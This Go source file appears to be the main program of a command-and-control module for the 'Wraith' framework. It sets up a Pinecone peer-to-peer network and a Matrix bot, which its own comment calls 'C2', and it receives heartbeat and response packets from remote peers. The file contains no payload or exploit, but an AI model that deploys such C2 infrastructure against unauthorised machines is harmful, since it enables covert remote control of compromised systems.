package main

import (
	"context"
	"crypto/ed25519"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/radio"
	_ "github.com/mattn/go-sqlite3"
)

func main() {
	//
	// Create a struct to hold config values.
	//

	c := Config{}
	c.Setup()

	//
	// Validate the config.
	//

	if c.pineconeId == "" {
		fmt.Println("no pineconeId was specified; cannot continue")
		os.Exit(1)
	}
	if c.pineconeInboundTcpAddr == "" && c.pineconeInboundWebAddr == "" && !c.pineconeUseMulticast && c.pineconeStaticPeers == "" {
		fmt.Println("no way for peers to connect was specified; cannot continue")
		os.Exit(1)
	}
	pineconeIdBytes, err := hex.DecodeString(c.pineconeId)
	if err != nil {
		fmt.Println("provided pineconeId was not a hex-encoded string; cannot continue")
		os.Exit(1)
	}
	pineconeId := ed25519.PrivateKey(pineconeIdBytes)

	//
	// Configure pinecone manager.
	//

	// Get a struct for managing pinecone connections.
	pr := radio.GetInstance()

	pr.SetPineconeIdentity(pineconeId)
	if c.logPinecone {
		pr.SetLogger(log.Default())
	}
	pr.SetInboundAddr(c.pineconeInboundTcpAddr)
	pr.SetWebserverAddr(c.pineconeInboundWebAddr)
	pr.SetWebserverDebugPath(c.pineconeDebugEndpoint)
	pr.SetUseMulticast(c.pineconeUseMulticast)
	if c.pineconeStaticPeers != "" {
		pr.SetStaticPeers(strings.Split(c.pineconeStaticPeers, ","))
	}

	//
	// Configure signal handler for clean exit.
	//

	sigchan := make(chan os.Signal, 2)
	signal.Notify(sigchan, syscall.SIGTERM, syscall.SIGINT)

	//
	// Set up Matrix comms for C2.
	//
	matrixBotCtx, stopMatrixBot := context.WithCancel(context.Background())
	var matrixBotWait sync.WaitGroup
	client := MatrixBotInit(matrixBotCtx, c, &matrixBotWait)
	MatrixBotRunStartup(client, c)
	MatrixBotEventHandlerSetUp(client, c)

	//
	// Main body.
	//

	// Create a state storage struct.
	s := MkState()

	// Start pinecone.
	go pr.Start()

	client.JoinedRooms()

	// Start receiving Wraith messages.
	// Background context is okay because the channel will be closed
	// when the manager exits further down anyway.
	recv := pr.RecvChan(context.Background())

mainloop:
	for {
		select {
		// Exit if requested.
		case <-sigchan:
			break mainloop
		// Clean up state.
		case <-time.After(STATE_CLEANUP_INTERVAL):
			s.Prune()
		// Process incoming packets.
		case packet := <-recv:
			peerPublicKey, err := hex.DecodeString(packet.Peer)
			if err != nil {
				// This shouldn't happen, but if the peer public key is
				// malformed then we have no choice but to ignore the
				// packet.
				continue mainloop
			}

			switch packet.Route {
			case proto.ROUTE_HEARTBEAT:
				packetData := proto.PacketHeartbeat{}
				err = proto.Unmarshal(&packetData, peerPublicKey, packet.Data)
				if err != nil {
					// The packet data is malformed, there is nothing more we
					// can do.
					continue mainloop
				}
				go s.Heartbeat(packet.Peer, packetData)
			case proto.ROUTE_RESPONSE:
				packetData := proto.PacketRes{}
				err = proto.Unmarshal(&packetData, peerPublicKey, packet.Data)
				if err != nil {
					// The packet data is malformed, there is nothing more we
					// can do.
					continue mainloop
				}
				go s.Response(packet.Peer, packetData)
			}
		}
	}

	//
	// On exit.
	//

	fmt.Println("exit requested; exiting gracefully")

	go func() {
		<-sigchan
		fmt.Println("exit re-requested; forcing")
		os.Exit(1)
	}()

	// Stop pinecone.
	pr.Stop()

	// Stop Matrix bot.
	stopMatrixBot()
	matrixBotWait.Wait()

	os.Exit(0)
}
